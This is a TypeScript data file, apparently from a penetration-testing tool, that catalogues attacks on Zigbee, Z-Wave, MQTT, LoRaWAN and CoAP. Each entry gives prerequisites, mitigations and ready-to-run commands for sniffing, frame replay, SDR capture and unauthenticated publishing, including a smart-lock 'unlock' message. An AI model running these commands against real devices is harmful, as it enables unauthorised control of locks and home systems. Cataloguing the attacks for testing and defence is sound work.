export interface IoTProtocolAttack {
  id: string;
  name: string;
  protocol: "zigbee" | "zwave" | "mqtt" | "lora" | "coap" | "thread" | "matter";
  category: "replay" | "injection" | "sniffing" | "key_extract" | "dos" | "firmware" | "mitm";
  frequency: string;
  cves: string[];
  description: string;
  impact: string;
  prerequisites: string[];
  tools: string[];
  commands: { tool: string; command: string; description: string }[];
  mitigations: string[];
  severity: "critical" | "high" | "medium" | "low";
  stealthScore: number;
  references: string[];
}

export const IOT_PROTOCOL_ATTACKS: IoTProtocolAttack[] = [
  {
    id: "zigbee_key_sniff",
    name: "Zigbee Network Key Sniffing",
    category: "key_extract",
    protocol: "zigbee",
    frequency: "2.4 GHz",
    cves: [],
    description: "Capture Zigbee network key during device join/rejoin. The network key is transmitted encrypted with the well-known Trust Center Link Key (default: ZigBeeAlliance09) during initial pairing.",
    impact: "Decrypt all Zigbee traffic, control smart home devices, inject commands",
    prerequisites: ["IEEE 802.15.4 sniffer (TI CC2531, ApiMote, Ubertooth)", "Target during device join/rejoin process", "Default Trust Center Link Key in use"],
    tools: ["killerbee", "zboss-sniffer", "wireshark", "ti-cc2531"],
    commands: [
      { tool: "killerbee", command: "zbdump -f 15 -c 11 -w capture.pcap", description: "Capture Zigbee traffic on channel 11" },
      { tool: "killerbee", command: "zbstumbler", description: "Discover Zigbee networks and channels" },
      { tool: "wireshark", command: "wireshark -k -i /dev/ttyUSB0 -Y 'zbee_aps'", description: "Live Zigbee capture with Wireshark" },
    ],
    mitigations: ["Use Install Code-based joining", "Implement Zigbee 3.0 Distributed Security", "Monitor for unauthorized join events"],
    severity: "high",
    stealthScore: 1,
    references: ["https://github.com/riverloopsec/killerbee"],
  },
  {
    id: "zigbee_replay",
    name: "Zigbee Frame Replay",
    category: "replay",
    protocol: "zigbee",
    frequency: "2.4 GHz",
    cves: [],
    description: "Capture and replay Zigbee frames (e.g., unlock command, light control). Some Zigbee implementations don't properly validate frame counters, allowing replay of captured commands.",
    impact: "Replay smart lock unlock commands, control IoT devices, trigger actuators",
    prerequisites: ["Known network key (or captured during join)", "802.15.4 transceiver", "Frame counter not strictly enforced"],
    tools: ["killerbee", "apimote", "hackrf"],
    commands: [
      { tool: "killerbee", command: "zbreplay -f capture.pcap -i 15", description: "Replay captured Zigbee frames" },
    ],
    mitigations: ["Enforce frame counter validation", "Use APS-level security", "Monitor for duplicate frame counters"],
    severity: "high",
    stealthScore: 2,
    references: [],
  },
  {
    id: "zwave_sdr_intercept",
    name: "Z-Wave SDR Interception (S0 Downgrade)",
    category: "sniffing",
    protocol: "zwave",
    frequency: "868 MHz / 908 MHz",
    cves: [],
    description: "Z-Wave S0 security uses a known temporary key (all zeros) during initial inclusion. Even Z-Wave S2 devices can be downgraded to S0 during inclusion. SDR can capture the key exchange.",
    impact: "Intercept Z-Wave commands, unlock smart locks, control home automation",
    prerequisites: ["SDR capable of 868/908 MHz (HackRF, RTL-SDR with appropriate antenna)", "Target during device inclusion", "Z-Wave S0 security in use"],
    tools: ["scapy-radio", "hackrf", "ez-wave", "z-wave-sniffer"],
    commands: [
      { tool: "hackrf", command: "hackrf_transfer -r zwave_capture.raw -f 908420000 -s 2000000", description: "Capture raw Z-Wave signal" },
      { tool: "scapy-radio", command: "python3 zwave_decode.py zwave_capture.raw", description: "Decode captured Z-Wave frames" },
    ],
    mitigations: ["Use Z-Wave S2 security exclusively", "Never include devices with downgrade", "Monitor for S0 fallback during inclusion"],
    severity: "high",
    stealthScore: 1,
    references: [],
  },
  {
    id: "mqtt_no_auth",
    name: "MQTT Broker No-Auth Access",
    category: "sniffing",
    protocol: "mqtt",
    frequency: "N/A (WiFi/Ethernet)",
    cves: [],
    description: "Many MQTT brokers (Mosquitto, HiveMQ) are deployed without authentication or with default credentials. Subscribe to # (wildcard) to receive all messages. Publish to control IoT devices.",
    impact: "Read all IoT sensor data, control actuators, inject false data, lateral movement",
    prerequisites: ["Network access to MQTT broker (port 1883/8883)", "No authentication or weak credentials"],
    tools: ["mosquitto-clients", "mqtt-explorer", "paho-mqtt"],
    commands: [
      { tool: "mosquitto-clients", command: "mosquitto_sub -h <broker_ip> -t '#' -v", description: "Subscribe to all MQTT topics" },
      { tool: "mosquitto-clients", command: "mosquitto_pub -h <broker_ip> -t 'device/cmd' -m '{\"action\":\"unlock\"}'", description: "Publish command to MQTT topic" },
      { tool: "mqtt-explorer", command: "mqtt-explorer", description: "GUI MQTT broker exploration" },
    ],
    mitigations: ["Enable MQTT authentication", "Use TLS (port 8883)", "Implement topic-level ACLs", "Use MQTT 5.0 with enhanced auth"],
    severity: "critical",
    stealthScore: 1,
    references: [],
  },
  {
    id: "lora_replay",
    name: "LoRaWAN Replay Attack",
    category: "replay",
    protocol: "lora",
    frequency: "868 MHz / 915 MHz",
    cves: [],
    description: "LoRaWAN ABP (Activation by Personalization) devices use static session keys and frame counters that reset on power cycle. Replay captured uplink/downlink messages after device restart.",
    impact: "Replay sensor data, inject false readings, trigger actuators via replayed commands",
    prerequisites: ["LoRa SDR or gateway (HackRF, LimeSDR, RAK831)", "Target uses ABP (not OTAA)", "Capture messages before device restart"],
    tools: ["hackrf", "lora-sdr", "chirpstack", "gr-lora"],
    commands: [
      { tool: "gr-lora", command: "gnuradio-companion lora_receiver.grc", description: "Receive and decode LoRa packets" },
      { tool: "hackrf", command: "hackrf_transfer -r lora_capture.raw -f 868100000 -s 1000000", description: "Capture raw LoRa signal" },
    ],
    mitigations: ["Use OTAA instead of ABP", "Implement persistent frame counters", "Use LoRaWAN 1.1 with enhanced security"],
    severity: "medium",
    stealthScore: 1,
    references: [],
  },
  {
    id: "coap_abuse",
    name: "CoAP Unauthenticated Access",
    category: "sniffing",
    protocol: "coap",
    frequency: "N/A (WiFi/Ethernet)",
    cves: [],
    description: "Constrained Application Protocol (CoAP) often deployed without DTLS security. Discover and access IoT device resources via CoAP GET/PUT/POST. Many CoAP servers expose device control endpoints.",
    impact: "Access IoT device data, control actuators, enumerate device capabilities",
    prerequisites: ["Network access to CoAP endpoint (port 5683)", "No DTLS configured"],
    tools: ["coap-cli", "aiocoap", "libcoap"],
    commands: [
      { tool: "coap-cli", command: "coap get coap://<device_ip>/.well-known/core", description: "Discover CoAP resources" },
      { tool: "coap-cli", command: "coap get coap://<device_ip>/sensor/temperature", description: "Read sensor data" },
      { tool: "coap-cli", command: "coap put coap://<device_ip>/actuator/switch -p '{\"state\":\"on\"}'", description: "Control actuator via CoAP" },
    ],
    mitigations: ["Enable DTLS for CoAP (coaps://)", "Implement CoAP authentication", "Use OSCORE for end-to-end security"],
    severity: "medium",
    stealthScore: 1,
    references: [],
  },
];
